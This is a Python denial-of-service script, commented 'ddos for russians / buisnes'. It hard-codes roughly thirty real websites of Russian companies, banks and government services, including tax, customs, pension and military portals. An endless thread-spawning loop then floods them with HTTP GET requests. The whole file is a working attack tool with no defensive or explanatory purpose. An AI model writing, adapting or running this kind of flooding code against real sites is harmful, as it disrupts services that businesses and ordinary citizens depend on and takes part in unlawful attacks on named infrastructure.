
import threading
import requests
import time
import sys
# ddos for russians / buisnes
site1 = "https://www.gazprom.ru/"
site2 = "https://ya.ru/"
site3 = "https://lukoil.ru"
site4 = "https://magnit.ru/"
site5 = "https://www.nornickel.com/"
site6 = "https://www.surgutneftegas.ru/"
site7 = "https://www.tatneft.ru/"
site8 = "https://www.evraz.com/ru/"
site9 = "https://nlmk.com/"
site10 = "https://www.sibur.ru/"
site11 = "https://www.severstal.com/"
site12 = "https://www.metalloinvest.com/"
site13 = 'https://nangs.org/'
site14 = 'https://rmk-group.ru/ru/'
site15 = 'https://www.tmk-group.ru/'
site16 = 'https://www.polymetalinternational.com/ru/'
site17 = 'https://www.uralkali.com/ru/'
site18 = 'https://www.eurosib.ru/'
site19 = 'https://omk.ru/'
##banks
bank1 = 'https://www.sberbank.ru/'
bank2 = 'https://www.vtb.ru/'
bank3 = 'https://www.gazprombank.ru/'
##gos
gos1 = 'https://www.gosuslugi.ru/'
gos2 = 'https://www.mos.ru/uslugi/'
gos3 = 'http://kremlin.ru/'
gos4 = 'http://government.ru/'
gos5 = 'https://mil.ru/'
gos6 = 'https://www.nalog.gov.ru/'
gos7 = 'https://customs.gov.ru/'
gos8 = 'https://pfr.gov.ru/'
gos9 = 'https://rkn.gov.ru/'

def dos():
 while True:
  requests.get(site1)
  requests.get(site2)
  requests.get(site3)
  requests.get(site4)
  requests.get(site5)
  requests.get(site6)
  requests.get(site7)
  requests.get(site8)
  requests.get(site9)
  requests.get(site10)
  requests.get(site11)
  requests.get(site12)
  requests.get(site13)
  requests.get(site14)
  requests.get(site15)
  requests.get(site16)
  requests.get(site17)
  requests.get(site18)
  requests.get(site19)
  requests.get(bank1)
  requests.get(bank2)
  requests.get(bank3)
  requests.get(gos1)
  requests.get(gos2)
  requests.get(gos3)
  requests.get(gos4)
  requests.get(gos5)
  requests.get(gos6)
  requests.get(gos7)
  requests.get(gos8)
  requests.get(gos9)
while True:
 threading.Thread(target=dos).start()